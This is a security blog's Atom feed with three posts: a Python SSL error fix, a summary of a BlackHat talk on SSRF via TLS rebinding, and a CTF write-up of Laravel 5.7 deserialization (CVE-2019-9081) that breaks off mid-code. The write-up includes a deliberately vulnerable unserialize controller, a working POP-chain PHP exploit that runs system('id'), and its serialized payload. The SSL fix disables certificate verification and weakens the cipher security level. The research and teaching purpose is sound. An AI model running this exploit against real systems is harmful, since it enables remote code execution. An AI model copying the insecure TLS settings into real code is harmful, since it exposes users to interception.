<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Z3R0YU</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zer0yu.github.io/"/>
  <updated>2020-11-19T10:56:46.132Z</updated>
  <id>http://zer0yu.github.io/</id>
  
  <author>
    <name>z3r0yu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>How to fix SSL: UNSUPPORTED_PROTOCOL EEROR in Python</title>
    <link href="http://zer0yu.github.io/2020/11/19/How-to-fix-SSL-UNSUPPORTED-PROTOCOL-EEROR-in-Python/"/>
    <id>http://zer0yu.github.io/2020/11/19/How-to-fix-SSL-UNSUPPORTED-PROTOCOL-EEROR-in-Python/</id>
    <published>2020-11-19T10:55:57.000Z</published>
    <updated>2020-11-19T10:56:46.132Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>今天老大遇到了一个问题，说让我解决一下，结果配环境+搜了一下午也没给搞定。最后还是老大自己给解决了。WTCL。在此记录一下该问题</p><h3 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01 问题描述"></a>0x01 问题描述</h3><p>操作系统环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 20.04.1 LTS</span><br><span class="line">Release:20.04</span><br><span class="line">Codename:focal</span><br></pre></td></tr></table></figure></p><p>openssl为最新版且相关信息如下，从信息中可以看到是支持TLS1/TLS1.1的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop$ openssl s_client -<span class="built_in">help</span> 2&gt;&amp;1  &gt; /dev/null | egrep <span class="string">"\-(ssl|tls)[^a-z]"</span></span><br><span class="line"> -ssl_config val            Use specified configuration file</span><br><span class="line"> -tls1                      Just use TLSv1</span><br><span class="line"> -tls1_1                    Just use TLSv1.1</span><br><span class="line"> -tls1_2                    Just use TLSv1.2</span><br><span class="line"> -tls1_3                    Just use TLSv1.3</span><br><span class="line"> -ssl_client_engine val     Specify engine to be used <span class="keyword">for</span> client certificate operations</span><br></pre></td></tr></table></figure></p><p>这套最新的环境在访问一些不支持TLS1.2的网站时候会出现一些问题，如果使用浏览器打开的话，浏览器会提示你启用对 TLS1.0/TLS1.1 的支持，此时只要点击了随后就完全OK。所以使用headless的话随后就不会面对这个问题了。但是如果使用Python的<code>requests</code>库的话，就会出现一下报错信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop$ python3 ssl_error.py </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"/usr/lib/python3/dist-packages/urllib3/contrib/pyopenssl.py"</span>, line 485, <span class="keyword">in</span> wrap_socket</span><br><span class="line">    cnx.do_handshake()</span><br><span class="line">  File <span class="string">"/home/zeroyu/.local/lib/python3.8/site-packages/OpenSSL/SSL.py"</span>, line 1934, <span class="keyword">in</span> do_handshake</span><br><span class="line">    self._raise_ssl_error(self._ssl, result)</span><br><span class="line">  File <span class="string">"/home/zeroyu/.local/lib/python3.8/site-packages/OpenSSL/SSL.py"</span>, line 1671, <span class="keyword">in</span> _raise_ssl_error</span><br><span class="line">    _raise_current_error()</span><br><span class="line">  File <span class="string">"/home/zeroyu/.local/lib/python3.8/site-packages/OpenSSL/_util.py"</span>, line 54, <span class="keyword">in</span> exception_from_error_queue</span><br><span class="line">    raise exception_type(errors)</span><br><span class="line">OpenSSL.SSL.Error: [(<span class="string">'SSL routines'</span>, <span class="string">'ssl_choose_client_version'</span>, <span class="string">'unsupported protocol'</span>)]</span><br></pre></td></tr></table></figure><p>造成此问题的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">req = requests.get(<span class="string">"https://URL"</span>,verify=<span class="literal">False</span>)</span><br><span class="line">print(req.status_code)</span><br></pre></td></tr></table></figure><h3 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h3><p>思路无非就是启用对低版本TLS的支持，因为从openssl的相关信息中可以看到是对TLS1.0/TLS1.1 支持的。</p><p>但是Stack Overflow论坛上的众多帖子均不能够解决这个问题，最后老大给出的解决方案是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS=<span class="string">'DEFAULT:@SECLEVEL=1'</span></span><br></pre></td></tr></table></figure><p>所以执行如下代码就完全没有问题了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class="line"><span class="comment">#requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS='DEFAULT:@SECLEVEL=1'</span></span><br><span class="line"></span><br><span class="line">req = requests.get(<span class="string">"https://URL"</span>,verify=<span class="literal">False</span>)</span><br><span class="line">print(req.status_code)</span><br></pre></td></tr></table></figure><h3 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h3><p>如果还有更好的方案，欢迎评论 or 交流。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;今天老大遇到了一个问题，说让我解决一下，结果配环境+搜了一下午也没给搞定。最后还是老大自己给解决了。
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>When TLS Hacks You -- BlackHat2020</title>
    <link href="http://zer0yu.github.io/2020/08/11/When-TLS-Hacks-You-BlackHat2020/"/>
    <id>http://zer0yu.github.io/2020/08/11/When-TLS-Hacks-You-BlackHat2020/</id>
    <published>2020-08-11T08:23:56.000Z</published>
    <updated>2020-08-11T08:24:44.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="When-TLS-Hacks-You"><a href="#When-TLS-Hacks-You" class="headerlink" title="When TLS Hacks You"></a>When TLS Hacks You</h1><h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>这是在blackhat2020上进行展示的一个关于SSRF+TLS rebinding的talk。具体来说就是利用TLS中的session id来承载payload对内网的应用进行攻击，它达到的目标跟之前 @<a href="https://twitter.com/orange_8361" target="_blank" rel="noopener">orangetw</a> 讲述的 SNI injection 方法是一样的，但是之前的方法是依赖于bug，而这种方法则依赖于TLS本身的特性。</p><p><a href="https://www.blackhat.com/us-20/briefings/schedule/#when-tls-hacks-you-19446" target="_blank" rel="noopener">演讲</a>|<a href="https://github.com/jmdx/TLS-poison/" target="_blank" rel="noopener">工具</a></p><h3 id="0x01-什么条件下可以实现这种攻击？"><a href="#0x01-什么条件下可以实现这种攻击？" class="headerlink" title="0x01 什么条件下可以实现这种攻击？"></a>0x01 什么条件下可以实现这种攻击？</h3><p><img src="https://i.loli.net/2020/08/11/uFdryGM9BAEhHZI.png" alt="-w373" style="zoom:50%;"></p><h4 id="1-首先是要有SSRF的常见攻击点"><a href="#1-首先是要有SSRF的常见攻击点" class="headerlink" title="1. 首先是要有SSRF的常见攻击点"></a>1. 首先是要有SSRF的常见攻击点</h4><ul><li>OIDC discovery</li><li>Webpush</li><li>Webmention</li><li>Apple Pay Web</li><li>In browsers, just phishing people (Then we call it CSRF)</li><li>Wificaptive portals</li><li>SSDP</li><li>SVG conversion</li><li>URL-based XXE</li><li>Scraping</li><li>Webhooks</li><li>PDF renderers with images enabled</li></ul><h4 id="2-看什么东西会缓存TLS-sessions"><a href="#2-看什么东西会缓存TLS-sessions" class="headerlink" title="2.看什么东西会缓存TLS sessions"></a>2.看什么东西会缓存TLS sessions</h4><p><img src="https://i.loli.net/2020/08/11/onY5MWAPBxuOdjm.png" alt="-w428" style="zoom:67%;"></p><h4 id="3-内网潜在的攻击对象有哪些"><a href="#3-内网潜在的攻击对象有哪些" class="headerlink" title="3. 内网潜在的攻击对象有哪些"></a>3. 内网潜在的攻击对象有哪些</h4><p><img src="https://i.loli.net/2020/08/11/D7XPLj1sNcvJlxo.png" alt="-w592" style="zoom:67%;"></p><h3 id="0x02-Real-world-SSRF"><a href="#0x02-Real-world-SSRF" class="headerlink" title="0x02 Real-world SSRF"></a>0x02 Real-world SSRF</h3><ol><li>Youtrack – <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12852" target="_blank" rel="noopener">CVE-2019-12852</a></li><li>Nextcloud</li></ol><blockquote><p>Federated sharing:<br>@<a href="mailto:someone@example.com" target="_blank" rel="noopener">someone@example.com</a><br>@<a href="mailto:someone@example.com" target="_blank" rel="noopener">someone@example.com</a>:11211<br>Use TLS rebinding, write to memcached!<br>Fix: no great options<br>Still added a request timeout and gave me a bounty</p></blockquote><h3 id="0x03-Demo-Phishing-gt-CSRF-gt-RCE"><a href="#0x03-Demo-Phishing-gt-CSRF-gt-RCE" class="headerlink" title="0x03 Demo: Phishing-&gt;CSRF-&gt;RCE"></a>0x03 Demo: Phishing-&gt;CSRF-&gt;RCE</h3><p>这个Demo基于以下假设：</p><blockquote><p>受害者是一个使用django.core.cache的项目的开发者，并且使用了memcached。<br>受害者在Chrome等易受影响的浏览器中浏览电子邮件。<br>攻击者知道/猜到这一点。<br>受害者很聪明，不会下载附件。</p></blockquote><p>示例代码如下：<br><img src="https://i.loli.net/2020/08/11/XhUODkReNsKYq47.png" alt="-w511"></p><p><img src="https://i.loli.net/2020/08/11/O1z8AqQciShx52H.png" alt="-w470"></p><h3 id="0x04-未来的工作"><a href="#0x04-未来的工作" class="headerlink" title="0x04 未来的工作"></a>0x04 未来的工作</h3><ul><li>内存崩溃链</li><li>NAT pinning</li><li>DOS放大攻击</li><li>更好的测试基础设施</li><li>在物联网设备上基于Image的CSRF</li><li>使用session ticket承载payload攻击内部HTTP服务器</li><li>攻击消息队列</li></ul><h3 id="0x05-防御手段"><a href="#0x05-防御手段" class="headerlink" title="0x05 防御手段"></a>0x05 防御手段</h3><ol><li>改变缓存的key<ul><li>比如当前是(hostname,port)，可以修改为(hostname,port,ip_addr)</li><li>如果你关心大型TLS部署的问题那么可以修改为(hostname,port,addr_type(ip_addr))，这方面与<a href="https://wicg.github.io/cors-rfc1918/" target="_blank" rel="noopener">CORS and RFC1918</a>比较相似</li></ul></li><li>禁用出站TLS session resumption<ul><li>libcurl: CURLOPT_SSL_SESSIONID_CACHE=false</li><li>firefox: security.ssl.disable_session_identifiers=true</li><li>Tor browser: disabled by default</li><li>Java, Nodejs, Chrome, others: no option</li></ul></li><li>web app是没有办法禁止出站TLS session resumption的，所以只能：<ul><li>特别留意一下 webhooks, apple pay</li><li>对出站请求设置代理，例如使用<a href="https://github.com/stripe/smokescreen" target="_blank" rel="noopener">smokescreen</a></li><li>避免运行未经身份验证的内部TCP内容，特别是在使用换行分隔符时</li></ul></li></ol><h3 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h3><ol><li>TLS对SSRF攻击是十分有效的</li><li>遵循最新的规格是打破常规的好方法</li><li>我们需要重新考虑TLS session resumption的优点<br>PS: 本文是对议题做了一个简单的简述，如果有误还请指正</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;When-TLS-Hacks-You&quot;&gt;&lt;a href=&quot;#When-TLS-Hacks-You&quot; class=&quot;headerlink&quot; title=&quot;When TLS Hacks You&quot;&gt;&lt;/a&gt;When TLS Hacks You&lt;/h1&gt;&lt;h3 id=&quot;0
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)</title>
    <link href="http://zer0yu.github.io/2020/06/28/Laravel-5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2019-9081-2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%A2%98%E8%A7%A3/"/>
    <id>http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/</id>
    <published>2020-06-28T00:18:36.000Z</published>
    <updated>2020-06-28T00:19:48.431Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>前天第五空间的时候5am3问我还会搞Laravel不。半年没打CTF了，真的是淡忘了很多，再加上当时牙疼到看着代码发蒙，所以题目中的链就给错过了。比赛之后复习了一下笔记📒。整合了其它笔记的内容，形成了这篇文章。<br>PS: 反序列化漏洞POP链是我当时最喜欢搞得，没想到这知识忘得真的快啊。</p><h3 id="0x01-判断题目环境的版本"><a href="#0x01-判断题目环境的版本" class="headerlink" title="0x01 判断题目环境的版本"></a>0x01 判断题目环境的版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ php artisan</span><br><span class="line">Laravel Framework 5.7.28</span><br></pre></td></tr></table></figure><h3 id="0x02-设置对应的入口点"><a href="#0x02-设置对应的入口点" class="headerlink" title="0x02 设置对应的入口点"></a>0x02 设置对应的入口点</h3><p>入口URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/index?p=</span><br></pre></td></tr></table></figure></p><p>与入口点相关的文件：</p><ol><li><p>路由文件 <code>routes/web.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'/index'</span>, <span class="string">'TaskController@index'</span>);</span><br></pre></td></tr></table></figure></li><li><p>反序列化的入口点 <code>app/Http/Controllers/TaskController.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line"> unserialize($_GET[<span class="string">'p'</span>]);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">"There is an param names p (get)"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="0x03-本地环境搭建"><a href="#0x03-本地环境搭建" class="headerlink" title="0x03 本地环境搭建"></a>0x03 本地环境搭建</h3><p>两种环境搭建方案</p><h4 id="A-本地环境配置"><a href="#A-本地环境配置" class="headerlink" title="A.本地环境配置"></a>A.本地环境配置</h4><p>操作系统：macOS<br>PHP版本：7.3.11<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">composer create-project laravel/laravel laravel57mac &quot;5.7.*&quot;</span><br><span class="line">cd laravel57mac</span><br><span class="line">php artisan serve --host=0.0.0.0 --port 8081</span><br></pre></td></tr></table></figure></p><h4 id="B-虚拟机环境配置"><a href="#B-虚拟机环境配置" class="headerlink" title="B.虚拟机环境配置"></a>B.虚拟机环境配置</h4><p>具体的环境配置过程参考：<a href="https://learnku.com/docs/laravel-development-environment/7.x/development-environment-macos/8443" target="_blank" rel="noopener">官方链接</a><br>虚拟环境的操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 虚拟机的启动</span><br><span class="line">cd ~/Homestead &amp;&amp; vagrant up</span><br><span class="line"># ssh登录虚拟机</span><br><span class="line">cd ~/Homestead &amp;&amp; vagrant ssh</span><br><span class="line"># ssh上去之后可以使用如下命令退出</span><br><span class="line">exit</span><br><span class="line"># 关闭 Homestead</span><br><span class="line">vagrant halt</span><br><span class="line"># 虚拟机删除</span><br><span class="line">vagrant destroy --force</span><br><span class="line"># 修改Homestead.yaml配置文件重新加载</span><br><span class="line">cd ~/Homestead &amp;&amp; vagrant up # 如果虚拟机是开启的则不需要执行这个命令</span><br><span class="line">vagrant provision</span><br></pre></td></tr></table></figure></p><p>xdebug远程调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#开启xdebug</span><br><span class="line">sudo phpenmod xdebug</span><br><span class="line">#关闭xdebug</span><br><span class="line">sudo phpdismod xdebug</span><br><span class="line">#客户端调试脚本</span><br><span class="line">xphp path/to/script</span><br><span class="line">#xdebug的配置文件修改</span><br><span class="line">/etc/php/7.#/fpm/conf.d/20-xdebug.ini</span><br></pre></td></tr></table></figure></p><p>web服务器切换(ngnix和apache)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flip</span><br></pre></td></tr></table></figure></p><h3 id="0x04-CVE-2019-9081"><a href="#0x04-CVE-2019-9081" class="headerlink" title="0x04 CVE-2019-9081"></a>0x04 CVE-2019-9081</h3><p>影响版本：Laravel v5.7<br>漏洞核心：<code>Illuminate/Foundation/Testing/PendingCommand</code>类中的<code>__destruct</code>方法中调用了<code>run</code>方法，而<code>run</code>方法是用来<code>Execute the command</code>的。因此需要找到对应的POP链来完成RCE。<br>首先看一下<code>PendingCommand</code>类中的几个重要属性：<br><img src="https://i.loli.net/2020/06/28/Z4j59vhtFQDcy3U.png" alt="-w872"><br>其次看一下关键的<code>run</code>方法，这其中有两个位置的代码比较关键。一个是与代码执行直接相关的，另外一个是与到达代码执行位置相关的方法<code>mockConsoleOutput</code>。我们必须保证方法<code>mockConsoleOutput</code>可以正常执行完毕。<br><img src="https://i.loli.net/2020/06/28/by7fIQELspNUPJt.png" alt="-w1145"><br>所有接下来就看一下<code>mockConsoleOutput</code>方法。由于程序可以正常执行到166行的位置，所以对162行的代码就不需要进行进一步的分析。<br><img src="https://i.loli.net/2020/06/28/YgOF1ZjoGQC72qx.png" alt="-w893"><br>分析的关键在于166行的的属性遍历。要控制这个数组我们只需要找到一个<code>public function __get</code>魔术方法就好了。一搜一大把，这里我们选择<code>Faker/DefaultGenerator</code>类中的。<br><img src="https://i.loli.net/2020/06/28/8Smulv4HJPdDk5s.png" alt="-w1014"><br>到这里为止我们先写一个PoC来进行动态分析一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>()</span><br><span class="line">        &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> &#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("1" =&gt; "1"));</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'id'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>执行之后的结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A0%3A%7B%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A2%3A%22id%22%3B%7D%7D</span><br></pre></td></tr></table></figure></p><p>此时可以看到已经成功过了<code>vendor/laravel/framework/src/Illuminate/Foundation/Testing/PendingCommand.php</code>中的第166行的代码<br><img src="https://i.loli.net/2020/06/28/8nlj2XRaBCysz4v.png" alt="-w1078"><br>可以到达关键的136行代码处。<br><img src="https://i.loli.net/2020/06/28/26UT9BshukNJHCi.png" alt="-w1133"><br>但是再往下走的程序就会抛出异常，所以要对136处的代码进行详细的分析。<br><img src="https://i.loli.net/2020/06/28/yGaVL2c6vEtHgj5.png" alt="-w1077"><br>这种链式调用不太好看变量中的内容，所以我在136行之前补充几行代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$kclass = Kernel::class;</span><br><span class="line">$app = <span class="keyword">$this</span>-&gt;app[Kernel::class];</span><br></pre></td></tr></table></figure></p><p>动态调试的过程中可以看到<code>Kernel::class</code>中的值是<code>Illuminate\Contracts\Console\Kernel</code>。而对应的<code>$app = $this-&gt;app[Kernel::class];</code>代码在执行时会抛出异常，所以我们要跟进这个部分。继续跟进之后到达<code>vendor/laravel/framework/src/Illuminate/Container/Container.php</code>文件中。我在动态分析的时候发现<code>Illuminate\Container\Container</code>类中调用的是<code>Illuminate\Container\BoundMethod</code> 的 <code>call</code> 静态方法。还有别忘了<code>Illuminate\Foundation\Application</code>类继承的是 <code>Illuminate\Container\Container</code>类的call方法。所以我们要继续往下跟。<br><img src="https://i.loli.net/2020/06/28/GSDoW6CO7ju5FRw.png" alt="-w894"><br>继续跟进之后可以看到一个关键函数<code>call_user_func_array</code>。继续跟进 <code>getMethodDependencies</code> 函数。该函数返回的是 <code>$dependencies</code> 数组和 <code>$parameters</code> 的合并数据，其中<code>$dependencies</code>默认为空数组，而 <code>$parameters</code> 为可控数据。<br><img src="https://i.loli.net/2020/06/28/rymOvWD8LYzs4Kk.png" alt="-w1058"><br>再加上此处<code>$callback</code>的值就是我们可控的值<code>system</code>，因此此处的实际形式为<code>call_user_func_array(可控数据,可控数据)</code>，可以构成任意代码执行。最终构造的POP链如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        